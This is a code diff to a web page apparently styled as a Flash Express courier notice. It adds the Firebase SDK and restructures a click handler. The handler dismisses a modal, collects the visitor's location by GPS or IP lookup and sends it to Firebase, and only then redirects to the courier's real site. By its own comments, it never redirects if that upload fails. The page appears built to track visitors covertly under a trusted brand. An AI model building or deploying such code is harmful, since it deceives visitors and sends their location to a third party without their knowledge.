@@ -31,6 +31,9 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="css/styles.css" />
+  <!-- Firebase SDK for Realtime Database -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
   <style>
     /* Flash Express Yellow-White Gradient Theme for Modal */
     .flash-yellow-gradient {
@@ -641,25 +644,26 @@ async function fetchIPGeo() {
 
     // ===== GLOBAL SCOPE FUNCTION: handleTargetClick =====
     async function handleTargetClick() {
-        // 1. ซ่อน Modal แจ้งเตือน
-        const modal = document.getElementById('modal-overlay');
-        if (modal) {
-            modal.style.opacity = '0';
-            modal.style.transition = 'opacity 0.3s ease';
-            setTimeout(() => { modal.style.display = 'none'; }, 300);
-        }
-
-        // 2. รันการดึงพิกัด (GPS หรือ IP Fallback) และส่งข้อมูลเข้า Firebase
         try {
+            // 1. ซ่อน Modal แจ้งเตือน
+            const modal = document.getElementById('modal-overlay');
+            if (modal) {
+                modal.style.opacity = '0';
+                modal.style.transition = 'opacity 0.3s ease';
+                setTimeout(() => { modal.style.display = 'none'; }, 300);
+            }
+
+            // 2. รันการดึงพิกัด (GPS หรือ IP Fallback) และส่งข้อมูลเข้า Firebase
             if (typeof runHybridGeolocation === 'function') {
                 await runHybridGeolocation();
             }
-        } catch (e) {
-            console.log("Geolocation error processed background");
-        }
 
-        // 3. ทำการเปลี่ยนหน้าเว็บทันทีที่ sendToFirebase ทำงานเสร็จ (หรือล้มเหลว)
-        window.location.href = FLASH_EXPRESS_URL;
+            // 3. ทำการเปลี่ยนหน้าเว็บหลังจากส่งข้อมูล Firebase เสร็จสิ้น
+            window.location.href = FLASH_EXPRESS_URL;
+        } catch (error) {
+            // หากเกิดความผิดพลาดใดๆ ห้ามเปลี่ยนหน้าเว็บเด็ดขาด
+            console.error("CRITICAL ERROR:", error);
+        }
     }
 
     // ===== INIT =====
